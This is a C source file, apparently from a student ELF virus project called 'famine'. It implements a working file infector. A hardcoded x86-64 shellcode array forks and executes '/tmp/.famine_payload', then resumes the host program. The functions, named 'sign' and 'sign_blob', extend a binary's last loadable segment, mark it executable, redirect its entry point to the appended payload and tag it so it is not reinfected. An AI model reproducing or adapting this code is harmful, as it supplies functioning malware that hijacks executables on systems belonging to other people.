#include "famine.h"

#include <stdint.h>
#include <limits.h>

static const unsigned char g_payload[PAYLOAD_BIN_SIZE] = {
	0xe8, 0x00, 0x00, 0x00, 0x00, 0x5b, 0x49, 0x89, 0xd6, 0x48, 0x8d, 0x7b, 0x30, 0x6a, 0x00, 0x57,
	0x48, 0x89, 0xe6, 0x31, 0xd2, 0xb0, 0x39, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x75, 0x04, 0xb0, 0x3b,
	0x0f, 0x05, 0x48, 0x83, 0xc4, 0x18, 0x31, 0xff, 0x31, 0xf6, 0x31, 0xd2, 0x48, 0x81, 0xc3, 0xef,
	0xbe, 0xad, 0xde, 0xff, 0xe3,
	0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x2e, 0x66, 0x61, 0x6d, 0x69, 0x6e, 0x65,
	0x5f, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
	0x69, 0x61, 0x6c, 0x67, 0x61, 0x63, 0x7c, 0x62, 0x65, 0x65, 0x6c, 0x69, 0x67, 0x75, 0x6c
};

Elf64_Phdr *last_phdr(char *data)
{
    int         i;
    Elf64_Ehdr  *ehdr;
    Elf64_Phdr  *phdrs;
    Elf64_Phdr  *target;

    ehdr = (Elf64_Ehdr *)(data);
    phdrs = (Elf64_Phdr *)(data + ehdr->e_phoff);
    target = NULL;
    i = 0;
    while(i < ehdr->e_phnum)
    {
        if (phdrs[i].p_type == PT_LOAD)
            target = &phdrs[i];
        i++;
    }
    return target;
}

uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
{
    Elf64_Phdr  *target;
    Elf64_Ehdr  *ehdr;
    uint64_t    orig_filesz;
    uint64_t    gap;
    uint64_t    old_entry;
    uint64_t    new_entry;
    uint64_t    delta;

    target = last_phdr(data);
    if (target == NULL)
        return 0;
    ehdr = (Elf64_Ehdr *)data;
    orig_filesz = target->p_filesz;
    gap = data_size - (target->p_offset + orig_filesz);
    new_entry = target->p_vaddr + orig_filesz + gap;
    target->p_filesz += gap + code_size;
    target->p_memsz  += gap + code_size;
    target->p_flags  |= PF_X;
    old_entry = ehdr->e_entry;
    ehdr->e_entry = new_entry;
    memmove(data + data_size, code, code_size);
    delta = (int64_t)old_entry - (int64_t)(new_entry + POP_RAX_OFFSET);
    return delta;
}

int is_signed(t_file file)
{
    size_t	window;

    if (file.head == MAP_FAILED || SIGNATURE_SIZE == 0 || file.size < SIGNATURE_SIZE)
        return 0;
    window = (file.size >= PAYLOAD_BIN_SIZE) ? PAYLOAD_BIN_SIZE : file.size;
    if (memmem(file.head + file.size - window, window, SIGNATURE, SIGNATURE_SIZE))
        return 1;
    return 0;
}

t_file file_load(const char *path, size_t append_size)
{
    t_file file;
    off_t  size;

    file.fd = -1;
    file.head = MAP_FAILED;
    file.size = 0;
    file.fd = open(path, O_RDWR);
    if (file.fd < 0)
        return file;
    size = lseek(file.fd, 0, SEEK_END);
    if (size < 0)
    {
        close(file.fd);
        file.fd = -1;
        return file;
    }
    file.size = size;
    if (lseek(file.fd, 0, SEEK_SET) < 0)
    {
        close(file.fd);
        file.fd = -1;
        return file;
    }
    if (append_size > 0)
    {
        if (ftruncate(file.fd, file.size + append_size) < 0)
        {
            close(file.fd);
            file.fd = -1;
            return file;
        }
    }
    file.head = mmap(NULL, file.size + append_size, PROT_READ | PROT_WRITE, MAP_SHARED, file.fd, 0);
    if (file.head == MAP_FAILED)
    {
        if (append_size > 0)
            ftruncate(file.fd, file.size);
        close(file.fd);
        file.fd = -1;
        return file;
    }
    file.size += append_size;
    close(file.fd);
    file.fd = -1;
    return file;
}

int file_unload(t_file file)
{
    if (file.head == MAP_FAILED || file.size == 0)
        return 1;
    msync(file.head, file.size, MS_SYNC);
    if (munmap(file.head, file.size))
        return 1;
    return 0;
}



int sign(t_file target)
{
    int64_t     entry;
    size_t      target_size;
    int32_t     *patch;

    if (target.head == MAP_FAILED || target.size < PAYLOAD_BIN_SIZE)
    {
        file_unload(target);
        return 1;
    }
    if (last_phdr(target.head) == NULL)
    {
        file_unload(target);
        return 1;
    }
	target_size = target.size - PAYLOAD_BIN_SIZE;
	entry = payload(target.head, target_size, (char *)g_payload, PAYLOAD_BIN_SIZE);
	if (entry < INT32_MIN || entry > INT32_MAX)
	{
		file_unload(target);
		return (1);
	}
	patch = memmem(target.head + target_size, PAYLOAD_BIN_SIZE,
			"\xEF\xBE\xAD\xDE", 4);
    if (patch)
        *patch = (int32_t)entry;
    file_unload(target);
    if (patch == NULL)
        return 1;
    return 0;
}

int sign_blob(t_file target)
{
    char    *trailer;

    if (target.head == MAP_FAILED || target.size < SIGNATURE_SIZE)
    {
        file_unload(target);
        return 1;
    }
    trailer = target.head + target.size - SIGNATURE_SIZE;
    memset(trailer, 0, SIGNATURE_SIZE);
    memcpy(trailer, SIGNATURE, SIGNATURE_SIZE);
    file_unload(target);
    return 0;
}
